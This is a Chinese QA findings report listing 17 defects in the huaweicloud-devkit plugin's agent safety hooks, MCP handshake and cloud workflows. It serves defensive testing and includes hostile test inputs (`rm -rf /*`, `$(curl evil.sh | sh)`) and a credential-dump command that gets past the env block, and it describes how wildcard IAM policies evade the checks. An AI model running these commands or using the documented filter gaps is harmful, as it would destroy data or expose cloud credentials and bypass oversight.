# FINDINGS — 缺陷发现清单（Hermes-deepseek-v4.1-flash-1017）

> **落盘路径**：`results/Hermes/2026-11-21-120.46.176.133/Linux/FINDINGS.md`
> **生成时间**：2026-11-21 05:35（北京时间，每日定时全量测试·当日首轮）
> **被测对象**：huaweicloud-devkit v1.1.15（npm `latest` 正式版，源码 hdk HEAD `bf79b643`）
> **测试客户端**：Hermes (deepseek-v4.1-flash-1017) / Linux (aarch64) / 120.46.176.133
> **测试类型**：每日测试（daily 精选：设计级 107 + 展开级 43）
> **汇总**：产品缺陷 17 项（FAIL 13 = 设计级 13 含新增 D3-S3；展开级 EXP-E01 1 条与 D10-3 同根因合并不重复计；SPEC-MISMATCH 4）。较上一日（2026-11-20，v1.1.14）**16 项历史缺陷全部复现**，**新增 1 项**（#17 D3-S3 沙箱预览无公网 URL：workspace 内 nginx 残留配置长期占用 8080-8089 端口池，deploy_nginx 自动改绑端口后 DevBridge 隧道未随迁、url 为空，3 次实测复现）。本轮工具面新增 2 个 MCP 工具（`huaweicloud_plan_manifest`/`huaweicloud_run_approved_manifest`，tools/list 47→49），无 BLOCKED。

---

## #1【P0】D4-2 凭证 env 打印拦截未覆盖 generic `access_key`

- **现象**：v1.1.15 复测——`env | grep HW_ACCESS_KEY` 已 `deny risk=credential`；但 `env | grep -i access_key` 仍返回 `allow risk=not_huaweicloud`（应 `deny`）。对照 `env | grep HUAWEICLOUD_SDK_AK`、`env | grep HCLOUD_AK` 均正确 `deny`。
- **断言**：`env | grep -i access_key`（generic `access_key`/`secret_key` 关键字，无云厂商前缀）应返回 `deny`。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:550` env-dump 正则 `/HUAWEICLOUD|HWC_|HW_|HCLOUD|OS_/i` 只匹配云厂商前缀，不匹配裸 `access_key`/`secret_key` 关键字。
- **影响**：可借 `env | grep access_key`（跨厂商通用凭证键名）提取 AK/SK 明文，凭证红线残留缺口。
- **证据**：`evidence/D4-2/stdout.txt`（classify-probe）

## #2【P0】D4-21 hook_check_artifacts 未拦截 HCL 形态 broad IAM 制品

- **现象**：v1.1.15 复测——`evaluateArtifacts` 对 HCL `resource "huaweicloud_iam_policy" ... actions = ["*"]` 返回 `decision=allow`；`data "huaweicloud_iam_policy" "r" { name = "AdministratorFullAccess" }` 亦 `allow`；JSON 形态 `{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}` 正确 `deny`。
- **断言**：Terraform HCL `actions = ["*"]` 与 `AdministratorFullAccess` 托管策略引用的 broad IAM 制品应被拦截（`deny`）。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:196`（规则 `hwc-iam-admin-policy`）regex 只覆盖 JSON 形态与 `Action = *`，未覆盖 HCL 小写复数 `actions = ["*"]`（带方括号列表）与 `AdministratorFullAccess` 托管策略后缀形态。
- **影响**：Terraform IaC broad IAM 绕过制品预检。
- **证据**：`evidence/D4-21/stdout.txt`（hook + hcl-probe）

## #3【P0】D9-12 initialize 握手协议安全基线两处缺口

- **现象**：v1.1.15 复测 D9-12 六项断言 4 通过/2 失败——① protocolVersion/capabilities/serverInfo ✓ ② tools/call 路由 ✓ ④ _decorateResult/_resetHintConsumption/_isHintConsumed ✓ ⑤ listSkillDirs/findSkillsRoot ✓；但 ③ initialize 分支不调 `runVersionCheck`（仅 `hdkitGenerateUserHash`/`getCachedUpdateInfo`，版本检查下沉 prewarm/check_cli 工具）；⑥ 未 initialize 先 tools/list 未拒（返回工具列表，契约要求 -32600）。
- **断言**：③ initialize 阶段触发版本检查（runVersionCheck）；⑥ 未 initialize 先 tools/list 应返回 JSON-RPC -32600。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:45-66` initialize 分支未调 `runVersionCheck`；`mcp-protocol.mjs:70` `dispatch()` 对 `tools/list` 分支无 initialize 前置状态机直接放行。
- **影响**：MCP 握手安全基线不完整——版本检查不在握手期执行；未初始化即可调用列表，协议时序约束缺失。
- **证据**：`evidence/D9-12/stdout.txt`（D9-12-probe）

## #4【P0】D10-4 风险规则库条目数漂移（SPEC）

- **现象**：v1.1.15 复测——规则库 `version=0.1.0 规则数=19（deny=9 warn=10）`，用例断言仍为「16 条(9 deny + 7 warn)」，断言漂移。实际逐条行为均正常（高危判 deny、只读判 allow、删除判 warn/deny、明文 secret 判 deny）。
- **断言**：用例断言「规则库 16 条」需与实现同步（当前 19 条）。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` 规则条目由 16 条（9 deny + 7 warn）增至 19 条（9 deny + 10 warn），用例断言未同步。
- **影响**：SPEC 断言漂移（实现正确），需维护用例母版。
- **证据**：`evidence/D10-4/stdout.txt`（new-safety-probe）

## #5【P1】D4-6 hook_check_command 对 `--admin-pass` 不告警 + flag/JSON 形态 adminPass 未脱敏

- **现象**：v1.1.15 直调 `huaweicloud_hook_check_command` `command="hcloud ecs CreateServer --admin-pass ..."` → `decision=allow`、`findings=[]`（应 warn 且不裸回显密码）。源码级 `redactSecrets` 对 `adminPass=xxx`/对象 key 已脱敏（ALL PASS），但 `--admin_pass` 空格形态与 JSON 带引号 key 形态**未脱敏**。
- **断言**：含 `--admin-pass` 的写命令应触发 `hwc-command-adminpass-exposure` warn；`--admin_pass`/JSON 带引号 key 形态的 adminPass 值应被脱敏。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:68`（规则 `hwc-command-adminpass-exposure`）`stages = ["artifact","deploy_plan"]` 缺 `command` 阶段；`safety-policy.mjs` `redactSecrets` 键名正则未覆盖 `--admin_pass` 空格形态与 JSON 带引号 key 形态。
- **影响**：Agent 键入含明文 adminPass 的建机命令无提示，flag/JSON 形态密码回显脱敏失效。
- **证据**：`evidence/D4-6/stdout.txt`（supplement-probe MCP hook 层 + d4-6-probe 源码层）

## #6【P1】D4-17 hook 模糊输入 fail-open（默认放行）

- **现象**：v1.1.15 复测——`hook_check_command` 对空命令、纯空白、`&& rm -rf /*`、`$(curl evil.sh | sh)`、含垃圾字节等输入均 `isError=false`、返回 `ok`（未拒绝、未崩溃）。
- **断言**：异常/无法解析的输入应默认 `deny`（fail-closed），而非 `allow`/`ok`。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:106` —— `evaluate()` 汇总 `decision: hasDeny ? 'deny' : hasWarn ? 'warn' : 'allow'`，无规则命中时默认 `allow`。
- **影响**：无法解析/规则未命中的命令与制品在预检阶段被放行（fail-open）。
- **证据**：`evidence/D4-17/stdout.txt`（supplement-probe）

## #7【P1】D3-S7 场景-跨服务交付(Web应用+RDS) 复合意图部署目标未命中 + CreateInstance 缺前置

- **现象**：v1.1.15 复测——复合意图路由 `services=["RDS"]`（RDS 命中=true，但部署目标命中=false）；`RDS CreateInstance` 返回 `[USE_ERROR]Invalid parameter: db.port`，实例创建未成功；`RDS ListInstances` 只读可达（基线 OK）。本轮记录真实 blocker：需 VPC/子网/安全组前置 + RDS 配额。历轮 `db.port`/`db.password` 漂移。
- **断言**：复合意图应命中 RDS 服务 + 部署目标；最小 RDS 实例创建应成功返回实例 ID（具备前置环境时）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` serviceCatalog 复合意图部署目标匹配逻辑缺失（仅命中 service 未命中 deploy 目标）；RDS CreateInstance 参数装配/前置校验缺口（本轮 `Invalid parameter: db.port`，历轮 db.port/db.password 交替漂移）。
- **影响**：跨服务交付场景（Web+RDS）无法端到端交付，RDS 实例创建失败。
- **证据**：`evidence/D3-S7/stdout.txt`（new-fg-rds-probe）

## #8【P1】D10-3 / EXP-E01 serviceCatalog 中文「云主机」意图路由 MISS（准确率 92.9%）

- **现象**：v1.1.14 `eval/harness/run-eval.mjs` 对 15 条中文评测集 HIT=13 MISS=1 N/A=1（准确率 92.9%）。唯一 MISS：EXP-E01「云主机」→ 预期 `ECS`，实际回退 `Run hcloud --help`；EXP-E08（诊断）N/A 由 EXP-E08-probe 覆盖（ALL PASS）。展开级 EXP-E01 同步判 FAIL（与 D10-3 同根因）。
- **断言**：中文「云主机」意图应路由命中 ECS，评测集准确率应 100%（N/A 诊断类除外）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs:2197` routeMap ECS 关键词清单缺「云主机」同义词。
- **影响**：ECS 场景中文意图召回漏常见同义词。
- **证据**：`evidence/D10-3/stdout.txt`（routing + eval-harness）

## #9【P1】D9-9 capabilities.cancellation 未声明（SPEC）

- **现象**：v1.1.15 复测——`initialize` 返回 `capabilities = {"tools":{}}`，未声明 `cancellation` 能力（`capabilities.cancellation 存在? false`）。
- **断言**：initialize 返回的 capabilities 应包含 `cancellation` 声明。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:60-62` initialize 响应 capabilities 构造未含 `cancellation` 字段。
- **影响**：MCP 能力协商契约漂移，取消能力不可协商。
- **证据**：`evidence/D9-9/stdout.txt`（extended-probe）

## #10【P2】D3-S5 场景-复合意图分层路由仅命中单一服务

- **现象**：v1.1.15 复测——复合中文意图（存储+托管）路由返回 `Run hcloud --help`（回退 help），存储命中=false、托管/部署命中=false、多路命中=false。
- **断言**：复合意图应拆分命中多个对应 service，分层推荐。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` serviceCatalog 单关键词并集路由，无复合意图分层拆解。
- **影响**：多服务编排场景路由不完整。
- **证据**：`evidence/D3-S5/stdout.txt`（new-scenario-probe）

## #11【P2】D3-S6 场景-FunctionGraph 定时任务创建失败（未生成 URN/触发器）

- **现象**：v1.1.15 复测——serviceCatalog 路由 FunctionGraph 命中，但 `CreateFunction` 返回 `[USE_ERROR]Invalid parameter: code.zip_file`（历轮分别为 `function_name`/`code.filename`/`code.zip_file`，均属参数装配缺口），未生成 URN、定时触发器未绑定；测后删除函数归零 OK。
- **断言**：创建 Python 函数应返回 URN，定时触发器绑定成功。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` FunctionGraph CreateFunction 参数装配缺口（本轮 `Invalid parameter: code.zip_file`，FUNCTION_OPS 装配不完整）。
- **影响**：FunctionGraph 定时任务场景无法交付。
- **证据**：`evidence/D3-S6/stdout.txt`（new-fg-rds-probe）

## #12【P2】D4-25 Python hook 写操作遥测误分类为 cli:invoke

- **现象**：v1.1.15 实测 `hooks/huaweicloud-safety.py` `record_cli_event`——只读 `hcloud ecs ListServersDetails` → `cli:read`（正确）；写 `hcloud vpc CreateVpc` → `cli:invoke`（应为 `cli:write`）；`hcloud help` → `cli:invoke`（正确）。
- **断言**：写操作 `hcloud <svc> <Create/Delete/Update...>` 应分类为 `cli:write`。
- **根因**：`plugins/huaweicloud-core/hooks/huaweicloud-safety.py:46` `WRITE_OPERATION_RE` 前置捕获组 `(^|[A-Za-z0-9])` 要求写操作前缀前是行首或字母数字，实际 `CreateVpc` 前是空格，永不匹配；应改用 `\b` 词边界。
- **影响**：Python hook 端写操作遥测被误分类，`hook-events.jsonl` 的 `cli:write` 事件缺失，遥测/审计失真（Node 端无此问题）。
- **证据**：`evidence/D4-25/stdout.txt`（new-safety-probe）

## #13【P2】D4-26 findings 证据脱敏不完整（明文 secret 残留）

- **现象**：v1.1.15 复测——hook findings.evidence 中明文 secret_key/adminPass 泄漏（`{"access_key":"AKIA***","secret_key":"SKSECRETVALUE9","adminPass":"MyP@ss12345"}`），明文 AK/SK/password 无残留断言 FAIL（`access_key` 已脱敏但 `secret_key`/`adminPass` 仍明文）。
- **断言**：findings.evidence 中 password/AK/SK 等敏感值应全部脱敏，无明文残留。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:22` `redactEvidence` 正则键名表仅匹配 `key[:=]value` 形态，未覆盖空格形态及 JSON 带引号 key。
- **影响**：安全预检回执泄露明文凭据/密码。
- **证据**：`evidence/D4-26/stdout.txt`（new-safety-probe）

## #14【P2】D8-9 sanitizeValue 未做凭证脱敏（SPEC）

- **现象**：v1.1.15 复测——`sanitizeValue("ak=AK123456 sk=SKsecret token=Tok123")` 原样返回（仅 trim/截断/去控制字符），未移除敏感值；installId 稳定持久=true。
- **断言**：sanitizeValue 应移除 ak/sk/token 等敏感值。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:190` sanitizeValue 仅 replace 空白 + slice 截断，无敏感值脱敏。
- **影响**：遥测字段若携带凭证将明文上报。
- **证据**：`evidence/D8-9/stdout.txt`（new-config-probe）

## #15【P2】D3-C14 沙箱 HDKit connect template_id 参数已下线（SPEC，断言漂移）

- **现象**：v1.1.15 直调 `hdkitConnect` 参数透传断言——探针要求 `source/env/git/template_id/flavor_id` 五键 `body.<k> = options.<k>` 透传；实测仅 `source/env/git/flavor_id` 四键透传，`template_id` 已不在 body 透传（`hdkitCredentials`/`hwlink getCredentials`/`createConnection` x-security-token 签名头均 OK）。对照上一日（v1.1.14 同版本）结论一致。
- **断言**：hdkitConnect 旧版 `template_id` 透传不再成立；改用 `pool_type`（ephemeral/persistent）。
- **根因**：`plugins/huaweicloud-core/src/sandbox/hdkitservice-api.mjs:191-194` —— `template_id` 自定义模板已下线（`if (options.pool_type) { body.pool_type = options.pool_type; ... }`，注释「自定义模板/显式 template_id 已下线，客户端不再上送」），改用 `pool_type` 经 `validatePoolType` 校验。探针/用例断言未同步。
- **影响**：SPEC 契约漂移（实现有意的 breaking change，向下不兼容旧 template_id 调用方）；需更新用例断言与探针，改用 pool_type 透传/校验断言。
- **证据**：`evidence/D3-C14/stdout.txt`（new-cloud-probe）

## #16【P2】D3-C2 OBS 建桶成功但 `hcloud OBS mb` 返回退出码 6（自动化判定被破坏）

- **现象**：v1.1.14 真云复测——`hcloud OBS mb obs://testbot3-hermes-obs-5208871026 -location=cn-north-4` 输出 `Create bucket [...] successfully, request id [...]`，桶真实创建成功（后续 set/get 静态站、删桶均 200/成功），**但进程退出码为 6**（非 0）。同机对照：`hcloud OBS ls` rc=0、`hcloud VPC ListVpcs` rc=0、`hcloud ECS ListServersDetails` rc=0；加 `--cli-secure-verify=false` 时 rc=3。独立复现 3/3（KooCLI 7.2.12）。
- **断言**：创建成功（响应含 `successfully`）时 `hcloud OBS mb` 退出码应为 0；当前非 0 使 `scripts/realcloud_e2e.mjs` 的 D3-C2 步骤1 `mb.ok && /success/i.test(mb.text)`（`ok = r.status === 0`）判定失败。
- **根因**：非 devkit JS 源码缺陷，位于 devkit 依赖的 KooCLI 二进制（`~/bin/hcloud`，KooCLI 7.2.12，devkit `install-hcloud` 安装链）OBS `mb` 子命令退出码映射：操作成功仍返回 6（secure-verify 关闭返回 3）；devkit 侧断言在 `scripts/realcloud_e2e.mjs:64` 依赖 rc=0。
- **影响**：任何以退出码判定 OBS 建桶结果的自动化/Agent 工作流（含 D3-C2）会误判失败；MCP `huaweicloud_obs_set_website_config` 工具链本身正常（set/get/delete 三步均 200）。
- **证据**：`evidence/D3-C2/stdout.txt`（realcloud_e2e.mjs + 人工独立复现 `/tmp/obs_mb.out`/`/tmp/dbg.out`，桶已删除归零）

## #17【P1】D3-S3 场景-沙箱预览出 URL —— 部署成功但无公网 URL（新增）

- **现象**：v1.1.15 真机复测 3 次（run_all 首轮 + new-cloud-probe 重跑 + 独立新会话补测）——`huaweicloud_sandbox_deploy_nginx` 均返回 `ok=true` 但 `url` 为空，`port` 被自动改绑（8080→8083/8086），返回 `warning: "Port 8080 is in use — auto-assigned port 8086 | ... Any DevBridge tunnel bound to port 8080 is detached: run devbridge port create <tunnelId> -p 8086 ..."`；`sandbox_deploy_check` 的 `nginx_serving=FAIL(no HTTP response)`、`devbridge_tunnel=FAIL`、`tunnel_url_accessible=FAIL(no tunnel)`；`nextStep=expose_via_devbridge`。沙箱内 `ss -ltnp` 实测：单一 nginx(pid 8464) 常驻监听 80/8080/8081/8082/8084，`/etc/nginx/conf.d/` 残留历史会话配置 `d3s3-site.conf`/`d3c3-proj.conf`/`hdk-e2e.conf`/`sample-react.conf`。
- **断言**：沙箱预览部署终点必须返回可访问公网 URL（`deploy_nginx.url` 非空且 `deploy_check.devbridge_tunnel=PASS`），会话关闭后端口与 nginx 配置被回收。
- **根因**：`plugins/huaweicloud-core/src/sandbox/session-manager.mjs:1282 closeSession()` 仅关闭 WS 连接（`session.close()`），未清理 `deployNginx()`（同文件 `:833`）写入的 `/etc/nginx/conf.d/<project>.conf` 与 nginx 进程；沙箱 workspace 跨会话/跨客户端复用 → 历史配置长期占用 8080-8089 端口池，`deployNginx` 冲突后只改绑端口并提示手工重建 DevBridge 隧道（`:200 formatPortConflictWarning`），不自动随迁隧道 → 无公网 URL。
- **影响**：同一沙箱 workspace 上第二次及以后的沙箱预览部署拿不到公网 URL（D3-S3 场景不可交付）；多客户端共用 workspace 时端口互相踩占（与 SandboxMonitor 报出的 `MCP -32603 ... all ports 8080-8089 are in use` 同源）。
- **证据**：`evidence/D3-S3/stdout.txt`（独立补测探针输出：`VERDICT url=EMPTY nginx=FAIL tunnel=FAIL`）+ `evidence/D3-S3/probe.mjs`；首轮/重跑证据见 `evidence/_probes/new-cloud.log`、`new-cloud-retry.log`（含 `ss -ltnp` 端口占用与 `/etc/nginx/conf.d` 残留清单）。
